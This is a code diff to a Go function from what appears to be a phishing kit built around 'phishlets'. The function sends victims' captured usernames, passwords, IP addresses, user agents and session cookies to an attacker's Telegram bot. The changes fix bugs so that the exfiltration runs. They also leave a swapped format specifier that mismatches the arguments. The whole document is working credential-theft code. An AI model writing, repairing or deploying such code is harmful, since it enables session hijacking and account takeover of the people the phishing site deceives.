@@ -50,13 +50,13 @@ func sendTelegramResult(cookies string, id int, phishlet string, username string
 	var err error
 	client, fileName := &http.Client{}, "filename-cookies.json"
 	url := fmt.Sprintf("%s/sendDocument?chat_id=%s", getUrl(), getChatId())
-	msg := fmt.Sprintf("[ 🍁 %d %s Cookies Result 🍁 ]\n\n********* [ 💻 Valid Login  💻 ] ********\n🌟 Username :   %s\n🔑 Password :   %s\n🌎 UserAgent:   %s\n💻 IP:   https://ip-api.com/%s\n\n*******[ 🍪 Cookies Captured 🍪 ] **********",id, phishlet, username, password, useragent, remote_addr)
+	msg := fmt.Sprintf("[ 🍁 %s %d Cookies Result 🍁 ]\n\n********* [ 💻 Valid Login  💻 ] ********\n🌟 Username :   %s\n🔑 Password :   %s\n🌎 UserAgent:   %s\n💻 IP:   https://ip-api.com/%s\n\n*******[ 🍪 Cookies Captured 🍪 ] **********",id, phishlet, username, password, useragent, remote_addr)
 	
 // 	postBody, _ := json.Marshal(map[string]string{
 // 		"chat_id":    getChatId(),
-// 		"text":       msg,
+// 		"caption":       msg,
 // 	})
-	err := ioutil.WriteFile(fileName, []byte(cookies), 0755)
+	err := os.WriteFile(fileName, []byte(cookies), 0755)
 	if err != nil {
 	   fmt.Printf("Unable to write file: %v", err)
 	}
@@ -67,14 +67,14 @@ func sendTelegramResult(cookies string, id int, phishlet string, username string
 	file, _ := os.Open(filePath)
 	defer file.Close()
 
-	responseBody := &bytes.NewBuffer{}
+	responseBody := &bytes.Buffer{}
 	writer := multipart.NewWriter(responseBody)
 	part, _ := writer.CreateFormFile("document", filepath.Base(file.Name()))
 	io.Copy(part, file)
 	writer.WriteField("caption", msg)
 	writer.Close()
 	
-	req, _ := http.NewRequest("POST", url, body)
+	req, _ := http.NewRequest("POST", url, responseBody)
 	req.Header.Add("Content-Type", writer.FormDataContentType())
 	client.Do(req)
 	os.Remove(fileName)
